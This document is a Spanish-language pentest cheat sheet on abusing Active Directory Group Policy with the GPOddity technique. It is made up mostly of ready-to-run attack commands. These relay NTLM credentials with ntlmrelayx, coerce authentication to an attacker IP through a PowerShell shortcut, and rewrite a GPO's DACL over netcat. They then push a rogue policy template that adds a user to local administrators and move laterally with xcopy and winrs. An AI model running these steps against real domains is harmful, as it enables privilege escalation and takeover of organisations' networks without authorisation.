# GPO Abuse - GPOddity 

Tags: #AD #Windows #Powershell #PrivEsc #PowerView 

[![GPOAbuse.png | 700 ](https://i.postimg.cc/jCVtQStr/GPOAbuse.png)](https://postimg.cc/BPCrJsjh)

```bash 
- GPOddity combina 'NTLM Relaying' y la modificación de 'Group Policy Container' 
- Al transmitir las credenciales de un usuario quien tiene 'WriteDACL' en GPO, podemos modificar el path (gPCFilesSysPath) de una plantilla de grupo (por defecto es SYSVOL)
- Esto habilita la carga de plantillas maliciosas desde una ubicación que podemos controlar 
```

```powershell 
❯ Get-DomainGPO -Identity 'DevOps Policy'     # Obtener info de la politica 
```

## Relaying 

### Paso 1 

```bash 
❯ ntlmrealyx.py -t ldaps://IP_DC -wh IP_Attack --http-port '80,8080' -i --no-smb-server    # Hacer un ataque de relaying desde Kali   
```

```powershell 
# Crear un 'shortcut' en la máquina de atacante Windows con el siguiente comando:  
❯ powershell.exe -Command "Invoke-WebRequest -Uri 'http://IP_Attack' -UseDefaultCredentials"
```

```bash 
❯ nc 127.0.0.1 11000    # Conectarse por netcat para escribir la politica 

	write_gpo_dacl user {GPO Name}             # Ejemplo de GPO = {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

### Paso 2 

* [GPOddity](https://github.com/synacktiv/GPOddity)

```bash 
# Generar un 'Group Policy Template' malicioso en Kali 

❯ python3 gpoddity.py --gpo-id 'GPO Name' --domain 'domain.corp' --username 'user' --password 'password' --command 'net localgroup administrators user /add' --rogue-smbserver-ip 'IP_Attack' --rogue-smbserver-share 'std1-gp' --dc-ip 'IP_DC' --smb-mode none  
```

```bash 
# Copiar el contenido 
❯ mkdir /mnt/std1-gp                # Crear un directorio 
❯ cp -r /GPT_Out/* /mnt/std1-gp     # Copiar los archivos del comando anterior 
```

### Paso 3 

```powershell 
❯ net share std1-gp=C:\AD\std1-gp   # Crear un share como 'Administrator' en la máquina de atacante Windows 
❯ net share std1-gp /delete         # Eliminar el recurso compartido 
```

```powershell 
❯ xcopy C:\AD\user1.lnk \\dcorp-ci\AI  
❯ winrs -r:dcorp-ci cmd /c "set computername && set username" 
```